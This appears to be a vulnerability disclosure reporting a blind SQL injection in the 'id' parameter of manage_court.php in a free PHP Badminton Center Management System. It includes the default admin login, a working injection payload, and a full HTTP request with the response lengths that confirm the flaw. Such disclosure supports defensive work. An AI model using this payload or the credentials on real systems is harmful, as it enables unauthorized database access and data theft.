# Badminton Center Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15318/badminton-center-management-system-phpoop-free-source-code.html

Current database name: bcms_db,length is 7

Vulnerability File: /bcms/admin/courts/manage_court.php?id=

Vulnerability location: /bcms/admin/courts/manage_court.php?id=,id

[+] Payload: /bcms/admin/courts/manage_court.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id

```sql
GET /bcms/admin/courts/manage_court.php?id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close
```

When length (database ()) = 6, Content-Length: 2168
![image](https://user-images.githubusercontent.com/54017627/170620731-3ac9421a-f017-4319-b4fa-04c3668fb8f7.png)

![image](https://user-images.githubusercontent.com/54017627/170620643-60374624-ecfa-42b3-9829-47a597c76da8.png)

When length (database ()) = 7, Content-Length: 2190
![image](https://user-images.githubusercontent.com/54017627/170620709-c37316d4-6cd1-4090-94e5-29b5c34e0f17.png)

![image](https://user-images.githubusercontent.com/54017627/170620684-8337aabc-710a-4432-8d10-968380bbb314.png)
